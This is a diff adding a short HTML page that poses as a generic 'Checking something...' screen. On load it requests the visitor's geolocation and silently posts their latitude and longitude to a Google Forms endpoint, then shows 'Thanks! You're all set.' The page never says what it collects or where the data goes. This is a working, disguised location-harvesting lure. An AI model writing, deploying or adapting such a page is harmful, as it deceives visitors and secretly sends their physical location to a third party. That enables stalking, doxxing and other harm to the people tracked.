@@ -1,0 +1,42 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Checking something...</title>
+</head>
+<body>
+  <h2>Just a sec...</h2>
+
+  <script>
+    function sendLocation(lat, lon) {
+      const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScXj55ICsVDGx0uFZDedikx65aZucf_P19OiOAiFgIe1XWT6g/formResponse";
+
+      const formData = new FormData();
+      formData.append("entry.1162753736", lat);  // Latitude
+      formData.append("entry.113735007", lon);   // Longitude
+
+      fetch(formUrl, {
+        method: "POST",
+        mode: "no-cors",
+        body: formData
+      });
+
+      document.body.innerHTML = "<h2>Thanks! You're all set.</h2>";
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          sendLocation(position.coords.latitude, position.coords.longitude);
+        }, function(error) {
+          document.body.innerHTML = "<h2>Location access denied or unavailable.</h2>";
+        });
+      } else {
+        document.body.innerHTML = "<h2>Geolocation not supported by your browser.</h2>";
+      }
+    }
+
+    getLocation();
+  </script>
+</body>
+</html>
